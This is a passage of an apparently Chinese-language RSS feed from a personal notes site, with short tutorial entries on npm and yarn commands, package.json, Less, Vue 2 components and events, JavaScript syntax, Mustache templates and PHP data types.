      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-init/</guid>
      <description>npm init 创建模块。用来初始化生成一个新的package.json文件。默认有一个引导界面，你可以一步步的配置，也可以通过带尾缀-f或-y来直接跳过引导界面。
npm init -y/npm init -f
创建模块，并直接跳过引导，直接生成一个默认的package.json文件。
使用-f创建，系统会提示npm WARN using &amp;ndash;force Recommended protections disabled.</description>
    </item>
    
    <item>
      <title>npm install</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-install/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-install/</guid>
      <description>npm install 在当前项目中，读取package.json里面的 dependencies 和devDependencies的配置来安装需要依赖的模块。
install 可简写为 i。
npm install jquery 在当前项目中安装 jquery 模块，默认安装的是最新版本。
npm install jquery -g 全局安装 jquery 模块，默认安装的是最新版本。
npm install jquery@3 安装 jquery 3.X.X 中的最新版本。
npm install jquery@3.0.1 安装指定版本的模块，也可用于将模块更新到指定版本。
npm install &amp;ndash;save --save是默认值，在 package.js文件的 dependencies 字段写入依赖，表示运行依赖（生产环境使用，项目上线后依旧会带着该模块）。
&amp;#34;dependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34; } npm install &amp;ndash;save-dev 在 package.js文件的 devDependencies 字段写入依赖，表示开发依赖（开发环境使用，项目上线后不会再带着该模块）。
&amp;#34;devDependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34; } </description>
    </item>
    
    <item>
      <title>npm install</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-run/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-run/</guid>
      <description>npm run package.json的scripts字段，可以用于指定脚本命令，供npm直接调用。npm run会创建一个 Shell，执行指定的命令。
start和test属于特殊命令，可以省略 run，其余的都得带上 run。
npm run的参数：
 如果不加任何参数，直接运行，会列出package.json里面所有可以执行的脚本命令 可配置参数，格式是加上两个连词线（&amp;ndash;）  </description>
    </item>
    
    <item>
      <title>npm list</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-list/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-list/</guid>
      <description>npm list 查看当前项目安装的所有模块。
npm list jquery 查看 jquery 模块的版本号。
npm list -g 查看本机全局安装的模块
npm list -g &amp;ndash;depth 0 列出全局安装的模块 带上[&amp;ndash;depth 0] 不深入到模块的支点 更简洁。</description>
    </item>
    
    <item>
      <title>npm package.json</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/package.json/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/package.json/</guid>
      <description>package.json 项目或模块的描述文件。
使用npm install安装模块的时候，会自动读取项目中package.json里面的 dependencies 和devDependencies的配置，来安装需要依赖的模块。
install 可简写为 i。
name 模块名。
version 模块版本号。
description 模块描述。
&amp;quot;^3.6.0&amp;quot;表示安装 3.X.X 中最新的版本。 &amp;quot;~3.6.0&amp;quot;表示安装 3.0.X 中最新的版本。
&amp;quot;3.6.0&amp;quot;若不加^或~，则表示指定安装3.6.0这个版本。
&amp;#34;dependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34; } homepage 包的官网 url
contributors 模块的其他贡献者
main 程序的主入口文件。默认是模块根目录下的 index.js。
script 脚本。
repository 模块代码存放的地方，一般是版本控制器：git、svn等。
keywords 关键字
author 包的作者姓名
license dependencies/devDependencies 依赖包列表。
dependencies是运行时依赖的包。
devDependencies是开发时依赖的包。</description>
    </item>
    
    <item>
      <title>npm uninstall</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-uninstall/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-uninstall/</guid>
      <description>npm uninstall 卸载当前项目中的模块。
npm uninstall -g 卸载全局中的模块（慎用）</description>
    </item>
    
    <item>
      <title>npm update</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-update/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-update/</guid>
      <description>npm update 将模块更新到最新版本
npm update jquery -g 更新指定全局模块。</description>
    </item>
    
    <item>
      <title>npm 基础命令</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</guid>
      <description>基础命令 npm -v 查看本机已安装的 npm 的版本
npm help 查看 npm 命令列表。</description>
    </item>
    
    <item>
      <title>Vue data</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</guid>
      <description>data data 中的数据，不是直接在 Vue 实例中，而是在_data中，而_data在 Vue 实例中。
data 中的数据，Vue 使用了数据代理和数据劫持，从而实现了数据响应式。
书写方式 对象式 Vue 实例中使用对象式和函数式都可以。
data: {  name: &amp;#39;Vue 实例&amp;#39;, }, 函数式 在组件实例中必须使用函数式，否则会报错。
data() {  return {  name: &amp;#39;组件实例&amp;#39;,  }; }, </description>
    </item>
    
    <item>
      <title>Vue methods</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</guid>
      <description>methods methods 中的函数，其 this 都指向 Vue 实例或者组件实例对象。
任何 Vue 实例中的方法，只能使用普通函数，不能使用箭头函数，否则箭头函数中的 this 指向就不再是 Vue，而是 window。
var vm = new Vue({ 	el: &amp;#39;#root&amp;#39;, 	data: { 	name: &amp;#39;China&amp;#39;, 	},  // 方法 	methods: {  // 只能使用普通函数 	showInfo() { 	console.log(this); 	},  // 不能使用箭头函数  showInfo:()=&amp;gt; { 	console.log(this); 	}, 	}, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 键盘事件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</guid>
      <description>键盘事件 @键盘事件.按键key值
Vue 中常用的按键别名：
 回车：enter 删除：delete 退出：esc 空格：space 换行：tab（必须配合 keydow 使用，如果使用 keyup，那么按下 tab 后，当前元素会失去焦点，则元素的 keyup 事件则不会触发）  Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但要注意，部分按键的 key 值默认是大坨峰命名，需要转为短横线命名，比如CapsLock。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keydown.Caps-Lock=&amp;#39;showInfo&amp;#39;&amp;gt; 系统修饰键（用法特殊）： ctrl、 alt、 shift、 meta。
 配合 keyup 使用：按下修饰键的同时，再按下其他健，随后只释放其他健，事件才被触发。 配合 keydown 使用：正常触发事件。  自定义 KeyCode
使用 Vue.confing.keyCode.自定义键名 = KeyCode
键盘事件连写
表示按下 ctrl + y才能触发事件。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keyup.ctrl.y=&amp;#39;showInfo&amp;#39;&amp;gt; </description>
    </item>
    
    <item>
      <title>yarn</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn/</guid>
      <description>Yarn Yarn 在 npm5 之前，优势明显，但在 npm5 之后，两者差别不大。
安装 全局安装：
npm install -g yarn 如果以后要将 Yarn 更新到最新版本，请运行：
yarn set version latest 优点 速度快
 并行安装。 离线模式  安装版本统一
更简洁的输出。
多注册来源处理。
更好的命令语义化。</description>
    </item>
    
    <item>
      <title>yarn 命令</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn-add/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn-add/</guid>
      <description>命令 yarn add 添加模块。
yarn remove 删除模块。
yarn add jquery &amp;ndash;dev 安装开发环境的jquery依赖。</description>
    </item>
    
    <item>
      <title>包管理器</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</guid>
      <description>包管理器 </description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E5%9F%BA%E7%A1%80/</guid>
      <description>基础 注释 // 开头的注释，less 不会将其编译到 css 文件中。
/**/ 包裹的注释，less 才会将其编译到 css 文件中
// 该注释不可见/* 该注释可见 */ 变量 使用@来申明一个变量: @color: #008c8c。
作为普通属性值只来使用：使用@color
作为选择器和属性名或 URL：@{attr}、@{class}、@{ur1}的形式。
// 属性值变量@color2: #2775e0;@color: #198484;// 选择器变量@class: .indiv;// 属性名变量@attr:width;div {// 使用属性名变量@{attr}: 100px;height: 100px;// 使用属性值变量background-color: @color2;// 使用选择器变量@{class}{width: 40px;height: 50px;background-color: @color;}} 被编译为：
div { 	width: 100px; 	height: 100px; 	background-color: #2775e0; } div .</description>
    </item>
    
    <item>
      <title>Less</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/less/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/less/</guid>
      <description>Less Less 一门向后兼容的 CSS 扩展语言。它扩展了 CSS，使 CSS 更易于维护和扩展。
Less 官方文档
安装 Node.js：
npm install -g less 引入：
&amp;lt;script src=&amp;#34;//cdnjs.cloudflare.com/ajax/libs/less.js/3.11.1/less.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 将 less 编译为 css 在 less 文件的目录引入执行，就会得到一个 编译后的 css 文件。
lessc styles.less &amp;gt; styles.css 当然，如果你使用的是 Vs Code，那么直接安装Easy Less扩展即可，每当你保存 less 文件的时候，它会自动将 less 文件编译为 css 文件，方便的很。</description>
    </item>
    
    <item>
      <title>Less 继承</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E7%BB%A7%E6%89%BF/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E7%BB%A7%E6%89%BF/</guid>
      <description>继承 使用 :extend()将混合规则集继承给指定的选择器。extend 是一个 Less 伪类
继承规则集不能带()。
// 定义一个继承，它不能有().center {position: absolute;left: 50%;top: 50%;transform: translate(-50%, -50%);}.wrap {width: 300px;height: 300px;background-color: aqua;.inner {// 将 .center 中的规则集继承到 .wrap .inner{} 中// 使用 all&amp;amp;:extend(.center);&amp;amp;:nth-child(1) {width: 500px;height: 100px;background-color: pink;}&amp;amp;:nth-child(2) {width: 80px;height: 80px;background-color: rgb(210, 29, 59);}}} </description>
    </item>
    
    <item>
      <title>Vue MVVM</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mvvm/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mvvm/</guid>
      <description>MVVM 双向数据绑定，数据影响视图，视图影响数据
M：模型，指 data 中的数据。
V：视图，指模板。
VM：视图模型，指 Vue 实例对象。
data 中的所有属性，最后都出现在了 Vue 实例上。
vue 实例上的所有属性，以及 Vue 原型上的所有属性，在 Vue 模板中国都可以直接使用。</description>
    </item>
    
    <item>
      <title>Vue set</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</guid>
      <description>set 给响应式对象添加一个属性，并且这个新属性是响应式的，因此，且会触发视图的更新。
该对象必须是响应式对象，因为 Vue 无法探测普通的新增属性。
该对象不能是 Vue 实例，或者 Vue 实例的根数据对象：data、。
如果响应式对象为 array，则第二个参数为 index.</description>
    </item>
    
    <item>
      <title>Vue 插值语法</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</guid>
      <description>插值语法 用于解析元素包含的内容，一般使用{{name}}来进行插值，其中name必须是 JavaScrip 表达式，且可以直接读取data中的所有数据。
&amp;lt;!-- 插值语法 --&amp;gt; &amp;lt;h1&amp;gt;hello！{{name}}&amp;lt;/h1&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue style</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/style/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/style/</guid>
      <description>style scoped 默认情况，给不同的组件书写 CSS 样式，最终都会汇总到一个文件，这极有可能导致样式覆盖等问题。
因此，我们可以给组件中的给&amp;lt;style&amp;gt;添加scoped属性，以表示它的样式只作用于当前模块，很好的实现了样式私有化的目的，这是一个非常好的机制。
&amp;lt;style scoped&amp;gt; .demo { 	font-size: 2rem; } &amp;lt;/style&amp;gt; 使用该属性后，它会给组件添加唯一的自定义属性，使我们原本的 CSS 选择器变为 CSS 属性选择器，使得该组件的样式是私有化。
为什么要慎用 在实际业务中我们往往会对公共组件样式做细微的调整，如果添加了scoped属性，那么样式将会变得不易修改。
lang 配置当前&amp;lt;style&amp;gt;中所使用的语言，使得 Vue 可以解析。例如：lees
&amp;lt;style lang=&amp;#34;less&amp;#34;&amp;gt; .demo { 	font-size: 2rem; 	.sub { 	color: rgb(59, 119, 123); 	} } &amp;lt;/style&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 使用组件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6/</guid>
      <description>使用组件 组件之间可以嵌套。
使用组件分为三步：
 定义组件。 注册组件。 应用组件。  组件名 -命名法：任何环境都可以使用。
大坨峰命名法：只能在脚手架环境下使用（更推荐）。
组件名应尽可能避免与 HTML 已有的元素重名。
定义组件 组件无el配置项。
data 必须是一个函数，该函数返回的对象作为该组件的数据。避免组件被复用时，其数据还存在引用关系。
由于没有el，组件的虚拟 DOM 树必须定义在template 或 render()中。
创建组件的时候，可以使用 name配置项指定当前组件在 Vue 开发者工具中所呈现的名字。
const Student = Vue.extend({ 	// 指定组件名 	name: &amp;#39;Rainy&amp;#39;, 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{studentName}}&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	studentName: &amp;#39;忧心&amp;#39;, 	}; 	}, }); 简写 简写方式定义组件，虽然我们没有调用 Vue.extend()方法，但实际上当我们注册组件时， Vue 会帮我们调用该方法。
const School = { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;哈佛&amp;#39;, 	}; 	}, }; 注册组件 局部注册组件 只能在当前实例 el 所指定的容器中使用的组件。</description>
    </item>
    
    <item>
      <title>Vue 插槽</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</guid>
      <description>插槽 单个插槽。将一个组件的内容，传递到&amp;lt;slot&amp;gt;&amp;lt;/solt&amp;gt;中。
&amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt; 具名插槽 有时我们需要多个插槽，就需要给 &amp;lt;slot&amp;gt; 带上一个名字。
一个不带 name 的 &amp;lt;slot&amp;gt; 出口会带有隐含的名字“default”。</description>
    </item>
    
    <item>
      <title>Vue 组件树</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</guid>
      <description>组件树 一个组件创建好后，往往会在各种地方使用它。它可能多次出现在 Vue 实例中，也可能出现在其他组件实例中，于是就形成了一棵组件树。</description>
    </item>
    
    <item>
      <title>Vue 重要的内置关系</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB/</guid>
      <description>重要的内置关系 VueConponent.prototype.__proto__ === Vue.prototype
为什么要有这个关系？
让该组件实例对象可以访问到 Vue 原型上的属性和方法。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; JavaScrip
// VueComponent 的实例对象 school const school = { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;button @click=&amp;#39;fun&amp;#39;&amp;gt;点击&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;哈佛&amp;#39;, 	}; 	}, 	methods: { 	fun() { 	// 调用 school 上没有的 val 	console.log(this.val); 	}, 	}, }; Vue.component(&amp;#39;school&amp;#39;, school);  // Vue new Vue({ 	template: `&amp;lt;school&amp;gt;&amp;lt;/school&amp;gt;`, 	el: &amp;#39;#app&amp;#39;, 	data: {}, }); // Vue 的 prototype Vue.</description>
    </item>
    
    <item>
      <title>VueCli</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vuecli/vuecli/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vuecli/vuecli/</guid>
      <description>VueCli 安装 全局安装：
npm install -g @vue/cli 安装完成后，用命令检查安装的版本
vue --version 创建项目 vue create vue-cli 接下来就是一些导航选择，根据自己选择即可。
运行工程 创建完成后，用cd进入 vue-cli 目录，再用npm run serve启动工程，出现以下提示即为运行成功：
 App running at:  - Local: http://localhost:8080/  - Network: unavailable Local：它会将工程托管到本地的一个服务器地址 http://localhost:8080/。
Network：运行时的网络状态。
项目中的目录文件 node_modules：保存着 Vue 所有直接或间接依赖的第三方库。
public：保存着页面模板。
src：源代码目录。
package.json：工程配置文件
  serve：开发环境，它会将工程托管到一个本地服务器进行预览。
  build：生产环境，它会将工程打包成一个dist文件夹，这个文件夹就是我们工程的源代码
  vue.config.js：vue-cli 的配置文件，大部分都配置都是 webpack 配置
 &amp;#34;scripts&amp;#34;: {&amp;#34;serve&amp;#34;: &amp;#34;vue-cli-service serve&amp;#34;,&amp;#34;build&amp;#34;: &amp;#34;vue-cli-service build&amp;#34;}, 还原工程 使用npm install，它会根据package.json文件中的dependencies和devDependencies来还原node_modules目录
配置二年级</description>
    </item>
    
    <item>
      <title>JavaScript Object 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/object/objet-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/object/objet-%E6%96%B9%E6%B3%95/</guid>
      <description>Object 方法 defineProperty() 用于在一个对象上定义一个新属性，或者修改一个对象的已有属性，并返回此对象。
使用 defineProperty() 定义的属性无法被枚举。
value 该属性对应的值。默认值为undefined。
enumerable 控制属性是否可以被枚举。
可枚举属性是指那些内部enumerable设置为 true 的属性，对于通过直接的赋值和属性初始化的属性，该标识值默认为即为 true，对于通过Object.defineProperty() 等定义的属性，该标识值默认为 false。
writable 控制属性是否可以被修改，默认值为false
configurable 控制属性是否可以被删除，默认值为false
get() 当访问当前属性时，会调用此函数。该函数的返回值会被用作当前属性的值。
set() 当前属性值被修改时，会调用此函数。该方法接受一个参数（当前属性被赋予的新值），会传入赋值时的 this 对象。
var number = 20; var person = { 	Name: &amp;#39;张三&amp;#39;, 	sex: &amp;#39;男&amp;#39;, 	// age: 25, }; Object.defineProperty(person, &amp;#39;age&amp;#39;, { 	// 每当我们读取 person 的 age 属性时，get() 就会被调用，且返回值是 age 的值 	get() { 	console.log(&amp;#39;读取 age 的值&amp;#39;); 	return number; 	}, 	// 每当我们修改 person 的 age 属性时，set() 就会被调用，且会收到被修改后的的值 	set(value) { 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 箭头函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</guid>
      <description>箭头函数 任何可以使用匿名函数的位置均可以使用箭头函数。
箭头函数适合与 this 无关的回调，不适合与 this 有关的回调。
// 普通匿名函数 var sum = function (a, b) { 	return a + b; }; console.log(sum(1, 2)); // 箭头函数 var sumES6 = (a, b) =&amp;gt; { 	return a + b; }; console.log(sumES6(4, 3)); 可以看出，定义箭头函在数语法上要比普通函数简洁得多。
参数 没有参数，直接写一个空括号()即可。
只有一个参数，可以省去包裹参数的括号。
多个参数，将参数依次用逗号(,)分隔。
// 无参数 var fun1 = () =&amp;gt; { 	console.log(&amp;#39;无参数&amp;#39;); };  // 只有一个参数 var fun2 = (name) =&amp;gt; { 	console.log(name); };  // 多个参数 var fun3 = (val1, val2, val3) =&amp;gt; { 	return [val1, val2, val3]; }; 函数体 如果箭头函数的函数体中只有一句代码，可以省去函数体的大括号{ }，此时rturn 必须省略。</description>
    </item>
    
    <item>
      <title>JavaScript 语法糖</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E6%B3%95%E7%B3%96/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E6%B3%95%E7%B3%96/</guid>
      <description>语法糖 对象属性简写 简写对象的属性以及方法。
var name = &amp;#39;月色&amp;#39;; var age = 20; var sex = &amp;#39;男&amp;#39;; // 传统对象的属性 var person = { 	name: name, 	age: age, 	Fun: function () { 	console.log(sex); 	}, }; // 语法糖对象的属性 var personES6 = { 	name, 	age, 	Fun() { 	console.log(sex); 	}, }; console.log(person); console.log(personES6); 模板字符串 用反引号``声明（传统字符串是双引号或单引号）。
通过模板字符串，你可以以${表达式}的形式在模板中插入任何 JavaScript 表达式、变量。
默认支持多行，无需使用\n来换行。
var person = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;20&amp;#39;, }; // 传统字符串拼接 var str = &amp;#39;my name is &amp;#39; + person.</description>
    </item>
    
    <item>
      <title>Mustache</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mustache/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mustache/</guid>
      <description>Mustache Mustache 是一个 轻逻辑放模板解析引擎。
小程序的 wxml 中的代码、Vue 中的插值都是用的 mustache。
语法 {{keyName}} 简单的变量替换。
{{{keyName}}} 输出会将等特殊字符转译，如果想保持内容原样输出可以使用{{{}}}。
{{#keyName}} {{/keyName}} 以#开始、以/结束表示区块，它会根据当前上下文中的键值来对区块进行一次或多次渲染。它的功能很强大，有类似 if、foreach 的功能。
{{^keyName}} {{/keyName}} 该语法与{{#keyName}} {{/keyName}} 类似，不同在于它是当 keyName 值为 null, undefined, false 时才渲染输出该区块内容。
{{.}} 表示枚举，可以循环输出整个数组。
{{!comments}} 表示注释
{{&amp;gt;partials}} 以&amp;gt;开始表示子模块，当结构比较复杂时，我们可以使用该语法将复杂的结构拆分成几个小的子模块。</description>
    </item>
    
    <item>
      <title>PHP 判断数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>判断变量类型 is_XX() 判断一个变量是否为指定数据类型，最终返回这个变量所保存数据的数据类型。
Bool 类型不能用 echo 来查看，需要使用 var_dump() 查看。
// true var_dump(is_int($a)); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;;  // false var_dump(is_int($b)); echo &amp;#39;&amp;lt;hr/&amp;gt;&amp;#39;; gettype() 获取变量的类型，得到的是该类型对应的字符串。
// string echo &amp;#39;a 的数据类型为：&amp;#39; . gettype($a); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; // integer echo &amp;#39;b 的数据类型为：&amp;#39; . gettype($b);  echo &amp;#39;&amp;lt;hr/&amp;gt;&amp;#39;; </description>
    </item>
    
    <item>
      <title>PHP 数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</guid>
      <description>数组 索引数组 用数字作为键名的数组一般叫做索引数组。用字符串表示键的数组就是下面要介绍的关联数组。索引数组的键是整数，而且从 0 开始以此类推。
关联数组 数组的key是字符串。
特点   可以使用整数或字符串作为下标。
  下标为整数则为索引数组。
  下标都为字符串，则为关联数组。
    不同的下标（字符串、整数）可以混合存在，则为混合数组。
  数组中元素的顺序以放入顺序为准，与指定的下标无关。
  特殊的下标自动转换：false、true、null。
  </description>
    </item>
    
    <item>
      <title>PHP 文件包含</title>
